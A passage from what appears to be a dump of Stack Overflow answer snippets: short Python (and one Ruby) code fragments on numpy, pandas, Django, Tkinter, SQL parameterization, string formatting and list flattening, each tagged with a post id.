</snippet></ROW><ROW><id>20398376</id><snippet>dict((covar_type,GMM(n_components=num,
                covariance_type=covar_type, init_params='wmc',n_init=1, n_iter=10)) for covar_type in covs for num in num_comp)
</snippet></ROW><ROW><id>20398376</id><snippet>covar_type</snippet></ROW><ROW><id>20398376</id><snippet>data = dict()
for covar_type in covs:
    for num in num_comp:
        # covar_type is the same for all iterations of this loop
        # hence only the last one "survives"
        data[covar_type] = GMM(...)
</snippet></ROW><ROW><id>20398376</id><snippet>data = dict()
for covar_type in covs:
    data[covar_type] = values = []
    for num in num_comp:
        values.append(GMM(...))
</snippet></ROW><ROW><id>20398376</id><snippet>data = dict()
for covar_type in covs:
    for num in num_comp:
        data[(covar_type, num)] = GMM(...)
</snippet></ROW><ROW><id>20398933</id><snippet>str.format</snippet></ROW><ROW><id>20398933</id><snippet>%</snippet></ROW><ROW><id>20398933</id><snippet>print("%5s %10s %7s" % (row))
</snippet></ROW><ROW><id>20398933</id><snippet>print("{:5} {:10} {:7}".format(*row))
</snippet></ROW><ROW><id>20398933</id><snippet>print("{:&gt;5} {:&gt;10} {:&gt;7}".format(*row))
</snippet></ROW><ROW><id>20398933</id><snippet>print("{:5} {:^10} {:7}".format(*row))
</snippet></ROW><ROW><id>20398933</id><snippet>:</snippet></ROW><ROW><id>20398933</id><snippet>columns = "{:5} {:10} {:7}"
# get col_names
print("{:20}".format("Student Table")
print(columns.format(*col_names))
for row in rows:
   print(columns.format(*row))
</snippet></ROW><ROW><id>20398966</id><snippet>ax.xaxis.get_xticklabels()</snippet></ROW><ROW><id>20398966</id><snippet>tick.set_color('r')</snippet></ROW><ROW><id>20398966</id><snippet>fig, ax = plt.subplots()

ax.plot(np.random.randn(100).cumsum(), c='k')

colors = ['r','b']

for n, tl in enumerate(ax.xaxis.get_ticklabels()):
    tl.set_color(colors[n%2])
</snippet></ROW><ROW><id>20398993</id><snippet>res</snippet></ROW><ROW><id>20398993</id><snippet>res = []
for i in range(1, 100):
    res.append(form.getvalue('opt_%d'%i))
    print res[i-1]
</snippet></ROW><ROW><id>20398993</id><snippet>form.getvalue('opt_i')</snippet></ROW><ROW><id>20399265</id><snippet>def WeekRequestForm(request):
    form = WeekSelection()
    weekstat = None
    if request.method == "POST":
        form = WeekSelection(request.POST)
        if form.is_valid():
            year = int(form.cleaned_data["q_year"])
            week = int(form.cleaned_data["q_week"])
            currstat_b = [year, week]
            weekstat = WeekRange(*currstat_b)
    return render_to_response('form.html', {'weekstat': weekstat, 'form': form},
        context_instance=RequestContext(request))
</snippet></ROW><ROW><id>20399438</id><snippet>&lt;Enter&gt;</snippet></ROW><ROW><id>20399438</id><snippet>&lt;Leave&gt;</snippet></ROW><ROW><id>20399438</id><snippet>import Tkinter as tk

class Example(tk.Frame):
    def __init__(self, *args, **kwargs):
        tk.Frame.__init__(self, *args, **kwargs)
        self.l1 = tk.Label(self, text="Hover over me")
        self.l2 = tk.Label(self, text="", width=40)
        self.l1.pack(side="top")
        self.l2.pack(side="top", fill="x")

        self.l1.bind("&lt;Enter&gt;", self.on_enter)
        self.l1.bind("&lt;Leave&gt;", self.on_leave)

    def on_enter(self, event):
        self.l2.configure(text="Hello world")

    def on_leave(self, enter):
        self.l2.configure(text="")

if __name__ == "__main__":
    root = tk.Tk()
    Example(root).pack(side="top", fill="both", expand="true")
    root.mainloop()
</snippet></ROW><ROW><id>20399615</id><snippet>dist, idx = tree.query(xy, k=8, eps=0, p=1)
columns = ["POINT_X", "POINT_Y", "Elev", "TEMP"]
px, py, elev, tmp = df[columns].values.T[:, idx, None]
tmp = np.squeeze(tmp)
one = np.ones_like(px)

m = np.concatenate((one, px, py, elev), axis=-1)
mtm = np.einsum("ijx,ijy-&gt;ixy", m, m)
mty = np.einsum("ijx,ij-&gt;ix", m, tmp)
b1,b2,b3 = np.linalg.solve(mtm, mty)[:, 1:].T

px, py, elev = px.squeeze(), py.squeeze(), elev.squeeze()

b1 = b1[:,None]
b2 = b2[:,None]
b3 = b3[:,None]

rdist = (1/dist)**2
t0 = tmp + b1*(xy[:,0,None]-px) + b2*(xy[:,1,None]-py) + b3*(dem[:,None]-elev)
outarr = (t0*rdist).sum(1) / rdist.sum(1)

print outarr
</snippet></ROW><ROW><id>20399615</id><snippet>[ -499.24287422  -540.28111668  -512.43789349  -589.75389439  -411.65598912
  -233.1779803  -1249.63803291  -232.4924416   -273.3978919   -289.35240473]
</snippet></ROW><ROW><id>20399615</id><snippet>np.linalg.solve</snippet></ROW><ROW><id>20399615</id><snippet>lstsq</snippet></ROW><ROW><id>20399615</id><snippet>solve</snippet></ROW><ROW><id>20399615</id><snippet>lstsq</snippet></ROW><ROW><id>20399615</id><snippet>dot</snippet></ROW><ROW><id>20399615</id><snippet>einsum()</snippet></ROW><ROW><id>20399615</id><snippet>dot</snippet></ROW><ROW><id>20399615</id><snippet>timeit</snippet></ROW><ROW><id>20399649</id><snippet>sql = """SELECT plate, datetime, id FROM %s WHERE DATE(datetime)="%s" """ % (tablename, rec_date)
cursor.execute(sql)
</snippet></ROW><ROW><id>20399649</id><snippet>sql = """SELECT plate, datetime, id FROM %s WHERE DATE(datetime)=?""" % tablename
cursor.execute(sql, [rec_date])
</snippet></ROW><ROW><id>20399649</id><snippet>sys.argv[n]</snippet></ROW><ROW><id>20399649</id><snippet>cam_name = sys.argv[1]</snippet></ROW><ROW><id>20399649</id><snippet>argparse</snippet></ROW><ROW><id>20399649</id><snippet>between</snippet></ROW><ROW><id>20399649</id><snippet>sql = "SELECT plate, datetime, id FROM " +tablename+ " WHERE datetime between ? and ?"
    cursor.execute(sql, [start_date, end_date])
</snippet></ROW><ROW><id>20399718</id><snippet>self.last_l</snippet></ROW><ROW><id>20399718</id><snippet>MyUDPHandler</snippet></ROW><ROW><id>20399718</id><snippet>BaseRequestHandler</snippet></ROW><ROW><id>20399718</id><snippet>last_l</snippet></ROW><ROW><id>20399718</id><snippet>last_l</snippet></ROW><ROW><id>20399718</id><snippet>self.server</snippet></ROW><ROW><id>20399718</id><snippet>UDPServer</snippet></ROW><ROW><id>20399718</id><snippet>__call__(request, client_address, server)</snippet></ROW><ROW><id>20399718</id><snippet>SocketServer.UDPServer</snippet></ROW><ROW><id>20399718</id><snippet>last_l</snippet></ROW><ROW><id>20399718</id><snippet>...
last_l = 0

class MyUDPHandler(SocketServer.BaseRequestHandler):
    ...
    def handle(self):
        global last_l
        ...
        selisih = fabs(float(atas)-float(last_l)) # used here
        if selisih &gt; self.noise_f:
            ...
            last_l = atas # and updated here
            ...
        if last_l == 0:
            last_l = atas # or updated here
 ...
</snippet></ROW><ROW><id>20399801</id><snippet>assert_called_once</snippet></ROW><ROW><id>20399801</id><snippet>StringIOMock.assert_foo_bar_does_not_exist()</snippet></ROW><ROW><id>20399801</id><snippet>assert_called_once_with</snippet></ROW><ROW><id>20399801</id><snippet>spec</snippet></ROW><ROW><id>20399801</id><snippet>@patch("StringIO.StringIO", spec=StringIO.StringIO)
def testSomethingNotWorkingAsExpected(self, StringIOMock):
    StringIOMock.assert_called_once() # will fail as the method doesn't exist
</snippet></ROW><ROW><id>20399819</id><snippet>None</snippet></ROW><ROW><id>20399819</id><snippet>NULL</snippet></ROW><ROW><id>20399819</id><snippet>None</snippet></ROW><ROW><id>20399819</id><snippet>foo = "something" # "something" is coming from your CSV file

try:
   val = int(foo)
except ValueError:
   # foo is something that cannot be converted to
   # a number. It could be an empty string, or a
   # string like 'hello'
   # provide a default value
   val = None

# Now use val to insert into the database
f = MyModel()
f.age = val
f.save()
</snippet></ROW><ROW><id>20399819</id><snippet>blank</snippet></ROW><ROW><id>20399819</id><snippet>null</snippet></ROW><ROW><id>20399819</id><snippet>null</snippet></ROW><ROW><id>20399819</id><snippet>blank</snippet></ROW><ROW><id>20399819</id><snippet>blank=True</snippet></ROW><ROW><id>20399819</id><snippet>blank=False</snippet></ROW><ROW><id>20399819</id><snippet>null</snippet></ROW><ROW><id>20399819</id><snippet>IntegerField</snippet></ROW><ROW><id>20399819</id><snippet>None</snippet></ROW><ROW><id>20399819</id><snippet>age = models.IntegerField(null=True)</snippet></ROW><ROW><id>20399819</id><snippet>age = models.IntegerField()</snippet></ROW><ROW><id>20399819</id><snippet>None</snippet></ROW><ROW><id>20399819</id><snippet>age = models.IntegerField(null=True)</snippet></ROW><ROW><id>20399819</id><snippet>None</snippet></ROW><ROW><id>20399819</id><snippet>NULL</snippet></ROW><ROW><id>20399819</id><snippet>age = models.IntegerField(blank=True, null=True)</snippet></ROW><ROW><id>20399819</id><snippet>None</snippet></ROW><ROW><id>20399819</id><snippet>NULL</snippet></ROW><ROW><id>20399819</id><snippet>age = models.IntegerField(blank=True)</snippet></ROW><ROW><id>20399819</id><snippet>default=0</snippet></ROW><ROW><id>20399837</id><snippet>void *</snippet></ROW><ROW><id>20399837</id><snippet>librc.rohc_alloc_compressor.restype = c_void_p
librc.rohc_activate_profile.argtypes = [c_void_p, c_int]
</snippet></ROW><ROW><id>20399891</id><snippet>libzbar-0.dll</snippet></ROW><ROW><id>20399891</id><snippet>c:\Program Files\ZBar\bin\libzbar-0.dll</snippet></ROW><ROW><id>20400114</id><snippet>((?:(?:[cC]:)|//home)[^\.]+\.[A-Za-z]{3})
</snippet></ROW><ROW><id>20400114</id><snippet>.</snippet></ROW><ROW><id>20400114</id><snippet>.</snippet></ROW><ROW><id>20400114</id><snippet>\.</snippet></ROW><ROW><id>20400114</id><snippet>&gt;&gt;&gt; print re.match("((?:(?:[cC]:)|//home)[^\.]+\.[A-Za-z]{3})", "//home/user/web/image.png").groups()
('//home/user/web/image.png',)

&gt;&gt;&gt; print re.match("((?:(?:[cC]:)|//home)[^\.]+\.[A-Za-z]{3})", "C:/users/path/image.png").groups()
('C:/users/path/image.png',)
</snippet></ROW><ROW><id>20400114</id><snippet>&gt;&gt;&gt; print re.match("((?:(?:[cC]:)|//home)[^\.]+\.[A-Za-z]{3})", "C:\users\path\image.png").groups()
('C:\\users\\path\\image.png',)
</snippet></ROW><ROW><id>20400114</id><snippet>.jpeg</snippet></ROW><ROW><id>20400114</id><snippet>{3}</snippet></ROW><ROW><id>20400114</id><snippet>{3,4}</snippet></ROW><ROW><id>20400262</id><snippet>reset_index</snippet></ROW><ROW><id>20400262</id><snippet>&gt;&gt;&gt; a.append(b).reset_index(drop=True)
0   -0.370406
1    0.963356
2   -0.147239
3   -0.468802
4    0.057374
5   -1.113767
6    1.255247
7    1.207368
8   -0.460326
9   -0.685425
dtype: float64
</snippet></ROW><ROW><id>20400262</id><snippet>&gt;&gt;&gt; timeit('from __main__ import np, pd, a, b; pd.Series(np.concatenate([a,b]))', number = 10000)
0.6133969540821536
&gt;&gt;&gt; timeit('from __main__ import np, pd, a, b; pd.concat([a, b], ignore_index=True)', number = 10000)
1.020389742271714
&gt;&gt;&gt; timeit('from __main__ import np, pd, a, b; a.append(b).reset_index(drop=True)', number = 10000)
2.2282133623128075
</snippet></ROW><ROW><id>20400568</id><snippet>executemany()</snippet></ROW><ROW><id>20400568</id><snippet>sql_fill_table_build = [('1',), ('2',), ('3',), ('4',), ('55',)]
</snippet></ROW><ROW><id>20400568</id><snippet>sql_fill_table_build = [['1'], ['2'], ['3'], ['4'], ['55']]
</snippet></ROW><ROW><id>20400568</id><snippet>'55'</snippet></ROW><ROW><id>20400568</id><snippet>'55'</snippet></ROW><ROW><id>20400568</id><snippet>'5'</snippet></ROW><ROW><id>20400568</id><snippet>'5'</snippet></ROW><ROW><id>20400568</id><snippet>DB_GATEWAY.executemany(sql_fill_table_build, [(v,) for v in sql_fill_table_header])
</snippet></ROW><ROW><id>20400568</id><snippet>cx_Oracle</snippet></ROW><ROW><id>20400568</id><snippet>DB_GATEWAY.executemany(sql_fill_table_build, ((v,) for v in sql_fill_table_header))
</snippet></ROW><ROW><id>20400568</id><snippet>cx_Oracle</snippet></ROW><ROW><id>20400612</id><snippet>min(f(x), g(x))</snippet></ROW><ROW><id>20400612</id><snippet>f</snippet></ROW><ROW><id>20400612</id><snippet>g</snippet></ROW><ROW><id>20400612</id><snippet>scipy.integrate</snippet></ROW><ROW><id>20400612</id><snippet>quad</snippet></ROW><ROW><id>20400679</id><snippet>c, cov</snippet></ROW><ROW><id>20400679</id><snippet>(c, cov)</snippet></ROW><ROW><id>20400679</id><snippet>models[c,cov] = values = []
</snippet></ROW><ROW><id>20400679</id><snippet>for cov in covs:
    for c in class_names:
        for num in num_comp:
            models[(c, cov)].fit(training_data[c])
</snippet></ROW><ROW><id>20400679</id><snippet>AttributeError</snippet></ROW><ROW><id>20400679</id><snippet>models[(c,cov)]</snippet></ROW><ROW><id>20400679</id><snippet>values</snippet></ROW><ROW><id>20400679</id><snippet>for c in class_names:
    models[c] = {}
    for cov in covs:
        models[c][cov] = values = []
        for num in num_comp:
            values.append(GMM(n_components=num,covariance_type=cov, init_params='wmc',n_init=1, n_iter=10))
</snippet></ROW><ROW><id>20400679</id><snippet>list</snippet></ROW><ROW><id>20400679</id><snippet>models[c][cov]</snippet></ROW><ROW><id>20400679</id><snippet>for cov in covs:
    for c in class_names:
        for num in num_comp:
            for f in models[c][cov]
                f.fit(training_data[c])
</snippet></ROW><ROW><id>20400787</id><snippet>Functions</snippet></ROW><ROW><id>20400787</id><snippet>Application</snippet></ROW><ROW><id>20400787</id><snippet>class Application(Frame, Functions):
</snippet></ROW><ROW><id>20400787</id><snippet>Functions</snippet></ROW><ROW><id>20400816</id><snippet>&gt;&gt;&gt; word == 'english'
array([False, False, False], dtype=bool)
</snippet></ROW><ROW><id>20400816</id><snippet>if</snippet></ROW><ROW><id>20400816</id><snippet>&gt;&gt;&gt; if word == 'english': pass
...
Traceback (most recent call last):
  File "&lt;stdin&gt;", line 1, in &lt;module&gt;
ValueError: The truth value of an array with more than one element is ambiguous. Use a.any() or a.all()
</snippet></ROW><ROW><id>20400816</id><snippet>words = list(words)</snippet></ROW><ROW><id>20400816</id><snippet>&gt;&gt;&gt; import numpy as np
&gt;&gt;&gt; from sklearn.feature_extraction.text import TfidfVectorizer
&gt;&gt;&gt; word = np.array(['one','two','three'])
&gt;&gt;&gt; tot_data = np.array(['one two three', 'who do I see', 'I see two girls'])
&gt;&gt;&gt; v = TfidfVectorizer(max_df=.95,stop_words=list(word))
&gt;&gt;&gt; v.fit(tot_data)
TfidfVectorizer(analyzer=u'word', binary=False, charset=None,
   ...
        tokenizer=None, use_idf=True, vocabulary=None)
</snippet></ROW><ROW><id>20400894</id><snippet>{{ value|join:"" }}</snippet></ROW><ROW><id>20400897</id><snippet>json.loads()</snippet></ROW><ROW><id>20400897</id><snippet>with open(file) as f:
    for line in f:
        # slice the next 6 lines from the iterable, as a list.
        lines = [line] + list(itertools.islice(f, 6))
        jfile = json.loads(''.join(lines))

        # do something with jfile
</snippet></ROW><ROW><id>20400897</id><snippet>json.load()</snippet></ROW><ROW><id>20400897</id><snippet>islice(f, 0, 7)</snippet></ROW><ROW><id>20400897</id><snippet>from itertools import islice, chain

def lines_per_n(f, n):
    for line in f:
        yield ''.join(chain([line], itertools.islice(f, n - 1)))
</snippet></ROW><ROW><id>20400897</id><snippet>with open(file) as f:
    for chunk in lines_per_n(f, 7):
        jfile = json.loads(chunk)

        # do something with jfile
</snippet></ROW><ROW><id>20400897</id><snippet>with open(file) as f:
    for line in f:
        while True:
            try:
                jfile = json.loads(line)
                break
            except ValueError:
                # Not yet a complete JSON value
                line += next(f)

        # do something with jfile
</snippet></ROW><ROW><id>20400969</id><snippet>[0]</snippet></ROW><ROW><id>20400969</id><snippet>for child in parsed['params']['children']:
</snippet></ROW><ROW><id>20400969</id><snippet>children</snippet></ROW><ROW><id>20400969</id><snippet>child = parsed['params']['children'][0]
print 'id: %s' % (child['data']['id'])
port_id.append(child['data']['id'])
print 'tid: %s' % (child['data']['tid'])
port_tid.append(child['data']['tid'])
</snippet></ROW><ROW><id>20401054</id><snippet>xmlstarlet val -e -s my.xsd my.xml
</snippet></ROW><ROW><id>20401119</id><snippet>site-packages</snippet></ROW><ROW><id>20401119</id><snippet>C:\PythonXY\Lib\site-packages
</snippet></ROW><ROW><id>20401119</id><snippet>__init__.py</snippet></ROW><ROW><id>20401119</id><snippet>__init__.py</snippet></ROW><ROW><id>20401119</id><snippet>C:\PythonXY\Lib\site-packages\&lt;my_library_folder&gt;\__init__.py
C:\PythonXY\Lib\site-packages\&lt;my_library_folder&gt;\module.py
</snippet></ROW><ROW><id>20401119</id><snippet>from &lt;my_library_folder&gt; import module
</snippet></ROW><ROW><id>20401119</id><snippet>__init__.py</snippet></ROW><ROW><id>20401119</id><snippet>__init__.py</snippet></ROW><ROW><id>20401119</id><snippet>C:\PythonXY\Lib\site-packages\&lt;my_library_folder&gt;\
    __init__.py
    module.py        
    subpackage\
        __init__.py
        submodule1.py
        submodule2.py
</snippet></ROW><ROW><id>20401310</id><snippet>spam.py</snippet></ROW><ROW><id>20401310</id><snippet>import mechanize
import BeautifulSoup

print "Hello World!"
</snippet></ROW><ROW><id>20401310</id><snippet>pyinstaller</snippet></ROW><ROW><id>20401310</id><snippet>pip install pyinstaller</snippet></ROW><ROW><id>20401310</id><snippet>spam.py</snippet></ROW><ROW><id>20401310</id><snippet>pyinstaller spam.py
</snippet></ROW><ROW><id>20401310</id><snippet>dist</snippet></ROW><ROW><id>20401310</id><snippet>--onefile</snippet></ROW><ROW><id>20401310</id><snippet>pyinstaller</snippet></ROW><ROW><id>20401705</id><snippet>set</snippet></ROW><ROW><id>20401705</id><snippet>set1 = set([words1])</snippet></ROW><ROW><id>20401705</id><snippet>[["a", "b", "c"]]</snippet></ROW><ROW><id>20401705</id><snippet>["a", "b", "c"]</snippet></ROW><ROW><id>20401705</id><snippet>[]</snippet></ROW><ROW><id>20401705</id><snippet>set1 = set(words1)</snippet></ROW><ROW><id>20401912</id><snippet>sys.argv[x]</snippet></ROW><ROW><id>20401912</id><snippet>&gt;&gt;&gt; '2' * 5         # str * int
'22222'

&gt;&gt;&gt; int('2') * 5    # int * int
10
</snippet></ROW><ROW><id>20401912</id><snippet>sys.argv[1]</snippet></ROW><ROW><id>20401912</id><snippet>int</snippet></ROW><ROW><id>20401912</id><snippet>float</snippet></ROW><ROW><id>20401912</id><snippet>import sys
st_run_time_1 = int(sys.argv[1]) * 60 # &lt;---

print ("Station 1 : %s" % st_run_time_1)
</snippet></ROW><ROW><id>20401972</id><snippet>from __future__ import unicode_literals
from django.utils.encoding import smart_text


safeText = smart_text('this is my tetxt : %s' % someVaribleHoldingTextData)
</snippet></ROW><ROW><id>20401972</id><snippet>theFile = open(path, 'r')
safeData = theFile.read().decode('utf-8')
</snippet></ROW><ROW><id>20402028</id><snippet>deck = []
for suit in ('spades', 'hearts', 'diamonds', 'clubs'):
    for n in range(2, 10):
        deck.append('%i of %s' % (n, suit))
</snippet></ROW><ROW><id>20402028</id><snippet>deck = ['%i of %s' % (n, suit) for suit in ('spades', 'hearts', 'diamonds', 'clubs') for n in range(2, 10)]
</snippet></ROW><ROW><id>20402516</id><snippet>from nltk.corpus import framenet
</snippet></ROW><ROW><id>20402516</id><snippet>nltk.corpus.reader</snippet></ROW><ROW><id>20402516</id><snippet>from nltk.corpus.reader import framenet
</snippet></ROW><ROW><id>20402639</id><snippet>(0...x.length).min_by { |i| y.find_index(x[i]) }
</snippet></ROW><ROW><id>20402639</id><snippet>obj,index = x.each_with_index.min_by { |o,i| y.find_index(o) }
index
</snippet></ROW><ROW><id>20402685</id><snippet>df.loc['a']</snippet></ROW><ROW><id>20402685</id><snippet>series[label]</snippet></ROW><ROW><id>20402685</id><snippet>label</snippet></ROW><ROW><id>20402685</id><snippet>dataframe[label]</snippet></ROW><ROW><id>20402685</id><snippet>label</snippet></ROW><ROW><id>20402688</id><snippet>sum()</snippet></ROW><ROW><id>20402688</id><snippet>&gt;&gt;&gt; sum(myList[0], [])
[1, 2, 3, 4, 5, 6, 7, 8, 9]
</snippet></ROW><ROW><id>20402688</id><snippet>sum()</snippet></ROW><ROW><id>20402688</id><snippet> def sum(values, start=0):
     total = start
     for value in values:
         total += value
     return total
</snippet></ROW><ROW><id>20402688</id><snippet>0 + [1, 2, 3]</snippet></ROW><ROW><id>20402688</id><snippet>[] + [1, 2, 3]</snippet></ROW><ROW><id>20402688</id><snippet>reduce()</snippet></ROW><ROW><id>20402688</id><snippet>operator.add()</snippet></ROW><ROW><id>20402688</id><snippet>sum()</snippet></ROW><ROW><id>20402688</id><snippet>from operator import add

reduce(add, myList[0])
</snippet></ROW><ROW><id>20402688</id><snippet>operator.add()</snippet></ROW><ROW><id>20402688</id><snippet>lambda a, b: a + b</snippet></ROW><ROW><id>20402688</id><snippet>list.__add__</snippet></ROW><ROW><id>20402688</id><snippet>operator.iadd()</snippet></ROW><ROW><id>20402688</id><snippet>list.extend()</snippet></ROW><ROW><id>20402688</id><snippet>from operator import iadd

reduce(add, myList[0], [])
</snippet></ROW><ROW><id>20402688</id><snippet>itertools.chain.from_iterable()</snippet></ROW><ROW><id>20402688</id><snippet>&gt;&gt;&gt; from itertools import chain
&gt;&gt;&gt; list(chain.from_iterable(myList[0]))
[1, 2, 3, 4, 5, 6, 7, 8, 9]
</snippet></ROW><ROW><id>20402688</id><snippet>myList</snippet></ROW><ROW><id>20402688</id><snippet>chain.from_iterable()</snippet></ROW><ROW><id>20402688</id><snippet>list(chain.from_iterable(*myList))</snippet></ROW><ROW><id>20402688</id><snippet>reduce(add, ...)</snippet></ROW><ROW><id>20402688</id><snippet>&gt;&gt;&gt; timeit.timeit("sum(myList[0], [])", 'from __main__ import myList')
1.2761731147766113
&gt;&gt;&gt; timeit.timeit("reduce(add, myList[0])", 'from __main__ import myList; from operator import add')
1.0545191764831543
&gt;&gt;&gt; timeit.timeit("reduce(lambda a, b: a.extend(b) or a, myList[0], [])", 'from __main__ import myList')
2.225532054901123
&gt;&gt;&gt; timeit.timeit("list(chain.from_iterable(myList[0]))", 'from __main__ import myList; from itertools import chain')
2.0208170413970947
</snippet></ROW><ROW><id>20402688</id><snippet>iadd</snippet></ROW><ROW><id>20402688</id><snippet>add</snippet></ROW><ROW><id>20402688</id><snippet>&gt;&gt;&gt; timeit.timeit("reduce(add, myList[0])", 'from __main__ import myList; from operator import add')
0.9298770427703857
&gt;&gt;&gt; timeit.timeit("reduce(iadd, myList[0], [])", 'from __main__ import myList; from operator import iadd')
1.178157091140747
&gt;&gt;&gt; timeit.timeit("reduce(add, myListDoubled)", 'from __main__ import myList; myListDoubled = myList[0] + myList[0]; from operator import add')
2.3597090244293213
&gt;&gt;&gt; timeit.timeit("reduce(iadd, myListDoubled, [])", 'from __main__ import myList; myListDoubled = myList[0] + myList[0]; from operator import iadd')
1.730151891708374
</snippet></ROW><ROW><id>20402688</id><snippet>def flatten(lst):
    try:
        return flatten(sum(lst, []))
    except TypeError:
        return lst
</snippet></ROW><ROW><id>20402688</id><snippet>&gt;&gt;&gt; flatten(myList)
[1, 2, 3, 4, 5, 6, 7, 8, 9]
&gt;&gt;&gt; flatten(myList + myList)
[1, 2, 3, 4, 5, 6, 7, 8, 9, 1, 2, 3, 4, 5, 6, 7, 8, 9]
</snippet></ROW><ROW><id>20402996</id><snippet>&gt;&gt;&gt; char = '&lt;'
&gt;&gt;&gt; lst = [3, 23, 67]
&gt;&gt;&gt; [(char, n) for n in lst]
[('&lt;', 3), ('&lt;', 23), ('&lt;', 67)]
</snippet></ROW><ROW><id>20402996</id><snippet>list</snippet></ROW><ROW><id>20402996</id><snippet>list</snippet></ROW><ROW><id>20403052</id><snippet># -*- coding: utf-8 -*-
</snippet></ROW><ROW><id>20403350</id><snippet>func1</snippet></ROW><ROW><id>20403350</id><snippet>class B(A):
    def func1(self):
        super(B, self).func1()
        op3()
</snippet></ROW><ROW><id>20403350</id><snippet>super(B, self).func1</snippet></ROW><ROW><id>20403350</id><snippet>B</snippet></ROW><ROW><id>20403350</id><snippet>func1()</snippet></ROW><ROW><id>20403350</id><snippet>self</snippet></ROW><ROW><id>20403350</id><snippet>func1()</snippet></ROW><ROW><id>20403350</id><snippet>op1()</snippet></ROW><ROW><id>20403350</id><snippet>op2()</snippet></ROW><ROW><id>20403350</id><snippet>op3()</snippet></ROW><ROW><id>20403350</id><snippet>A</snippet></ROW><ROW><id>20403350</id><snippet>self</snippet></ROW><ROW><id>20403350</id><snippet>class B(A):
    def func1(self):
        A.func1(self)
        op3()
</snippet></ROW><ROW><id>20403350</id><snippet>super()</snippet></ROW><ROW><id>20403350</id><snippet>super()</snippet></ROW><ROW><id>20403436</id><snippet>list</snippet></ROW><ROW><id>20403436</id><snippet>lst</snippet></ROW><ROW><id>20403436</id><snippet>for H in range(0,len(a_list)):
    if a_list[H] &gt; lst[3][0]:
        lstA = [number_list[i]]
        if function(lst[0],lstA) == lst[0][1]:
            if function(lst[1],lstA)== lst[1][1]:
                if function(lst[2],lstA)== lst[2][1]:
                    if function(lst[3],lstA)== lst[3][1]:
                        lstA.append(input('some input from the user'))
                        other_function(lstA)
                        if lstA[1]== 40:
                            print ('something something')
                            break out of EVERY loop 
                         else: 
                            for H in range(0,len(a_list)):
                                if a_list[H] &gt; lstA[0]:
                                    lstB = [number_list[i]]
                                    if function(lst[0],lstB) == lst[0][1]:
                                        if function(lst[1],lstB)== lst[1][1]:
                                            if function(lst[2],lstB)== lst[2][1]:
                                               if function(lst[3],lstB)== lst[3][1]:
                                                  if function(lstA,lstB)== lstA[1]:
                                                     lstB.append(input('some input from theuser'))
                                                     other_function(lstB)
                                                         if lstB[1]== 40:
                                                             print ('something something')
                                                                 break out of EVERY loop 
                                                         else: 
                                                            etc. (one extra comparison every time)  
</snippet></ROW><ROW><id>20403436</id><snippet>for H in range(0,len(a_list)):
    if a_list[H] &gt; lst[3][0]:
        continue #reducing indent levels by negating the check:
                 #quit on failure instead of work on success

    lstA = [number_list[i]]

    quit = False

    for j in range(4):
        if function(lst[j],lstA) != lst[j][1]: #testing FALSEHOOD
            quit = True
            break #the j loop only

    if quit:
        continue #reducing indent levels by negating the check

    lstA.append(input('some input from the user'))
    other_function(lstA)
    if lstA[1]== 40:
        print ('something something')
        break #out of EVERY loop
    #else: #don't need the else because we broke

    for H in range(0,len(a_list)):
        if not a_list[H] &gt; lstA[0]:
            continue #reducing indent levels by negating the check

        lstB = [number_list[i]]

        for j in range(4):
            if function(lst[j],lstB) != lst[j][1]: #testing FALSEHOOD
                quit = True;
                break #to the H loop
        if not quit and  function(lstA,lstB)== lstA[1]: #combining two checks
            lstB.append(input('some input from theuser'))
            other_function(lstB)
            if lstB[1]== 40:
                print ('something something')
                break #out of EVERY loop
            else: #at this point I'm lost and can't refactor
                etc. (one extra comparison every time)  
</snippet></ROW><ROW><id>20403436</id><snippet>#returns FALSE if a check fails, unlike the `quit` variable
def checker(lst, lstA):
    for i in range(4):
        if function(lst[i],lstA) != lst[i][1]: #testing FALSEHOOD
            return False;
    return True;


def main(???):
    for H in range(0,len(a_list)):
        if a_list[H] &gt; lst[3][0]:
            continue

        lstA = [number_list[i]]

        if not checker(lst,lstA):
            continue

        lstA.append(input('some input from the user'))
        other_function(lstA)
        if lstA[1]== 40:
            print ('something something')
            return #break out of EVERY loop

    for H in range(0,len(a_list)):
        if not a_list[H] &gt; lstA[0]:
            continue

        lstB = [number_list[i]]

        if checker(lst,lstB) and  function(lstA,lstB) == lstA[1]:
            lstB.append(input('some input from theuser'))
            other_function(lstB)
            if lstB[1]== 40:
                print ('something something')
                return # break out of EVERY loop
            else: #at this point I'm lost and can't refactor
                etc. (one extra comparison every time)  
</snippet></ROW><ROW><id>20403502</id><snippet>]</snippet></ROW><ROW><id>20403502</id><snippet>m[ls[0]] = [ m[ls[1]], m[ls[2]] ]
</snippet></ROW><ROW><id>20403502</id><snippet>m[ls[0]] = [ m[ls[1], m[ls[2]] ]
</snippet></ROW><ROW><id>20403612</id><snippet>start()</snippet></ROW><ROW><id>20404049</id><snippet>sklearn.prepocessing.normalize</snippet></ROW><ROW><id>20404049</id><snippet>scipy.linalg.norm</snippet></ROW><ROW><id>20404049</id><snippet>(normalize(w_csr,axis=1,copy=False,norm='l2')*normalize(x_csr,axis=1,copy=False,norm='l2')).todense()
</snippet></ROW><ROW><id>20404049</id><snippet>ValueError: dimension mismatch</snippet></ROW><ROW><id>20404049</id><snippet>normalize</snippet></ROW><ROW><id>20404049</id><snippet>matrix([[ 0.962341]])</snippet></ROW><ROW><id>20404049</id><snippet>def spnorm(a):
    return np.sqrt(((a.data**2).sum()))
</snippet></ROW><ROW><id>20404049</id><snippet>In [182]: b_csr
Out[182]: 
&lt;3x5 sparse matrix of type '&lt;type 'numpy.float64'&gt;'
with 5 stored elements in Compressed Sparse Row format&gt;

In [183]: b_csr.A
Out[183]: 
array([[ 1.,  0.,  0.,  0.,  0.],
       [ 0.,  2.,  0.,  4.,  0.],
       [ 0.,  0.,  0.,  2.,  1.]])

In [184]: spnorm(b_csr)
Out[184]: 5.0990195135927845

In [185]: norm(b_csr.A)
Out[185]: 5.0990195135927845
</snippet></ROW><ROW><id>20404229</id><snippet>def a123():
</snippet></ROW><ROW><id>20404234</id><snippet>.tar.gz</snippet></ROW><ROW><id>20404234</id><snippet>tarfile</snippet></ROW><ROW><id>20404351</id><snippet>timeout=0</snippet></ROW><ROW><id>20404351</id><snippet>readline()</snippet></ROW><ROW><id>20404351</id><snippet>timeout=.5</snippet></ROW><ROW><id>20404351</id><snippet>bal.read(100)</snippet></ROW><ROW><id>20404514</id><snippet>for</snippet></ROW><ROW><id>20404514</id><snippet>TeamAScore = 0
TeamBScore = 0

TeamAWins = 0
TeamBWins = 0
NoWins = 0

for i in range(100):
    LuckA = random.randrange(0,25)
    LuckB = random.randrange(0,25)

